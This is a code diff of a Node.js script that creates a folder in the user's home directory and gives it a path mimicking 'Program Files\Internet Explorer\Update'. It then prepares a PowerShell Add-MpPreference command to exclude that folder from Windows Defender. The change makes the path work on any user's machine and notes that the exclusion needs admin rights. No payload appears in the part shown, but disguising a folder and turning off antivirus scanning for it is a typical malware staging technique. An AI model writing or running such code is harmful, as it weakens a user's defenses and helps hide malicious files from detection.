@@ -1,9 +1,13 @@
 const fs = require('fs');
 const path = require('path');
 const { exec } = require('child_process');
+const os = require('os');
 
-// Directory to create and exclude
-const dirPath = path.join('C:\\Users\\Lockm\\Documents\\scripts\\Program Files\\Internet Explorer\\Update');
+// Get current user's home directory
+const homeDir = os.homedir();
+
+// Build the directory path dynamically
+const dirPath = path.join(homeDir, 'Documents', 'scripts', 'Program Files', 'Internet Explorer', 'Update');
 
 // Create directory if it doesn't exist
 try {
@@ -17,7 +21,7 @@ try {
     console.error(`Failed to create directory: ${err.message}`);
 }
 
-// Add Defender exclusion
+// Add Defender exclusion (requires admin)
 const exclusionPath = dirPath;
 const psCommand = `Add-MpPreference -ExclusionPath '${exclusionPath}'`;
 
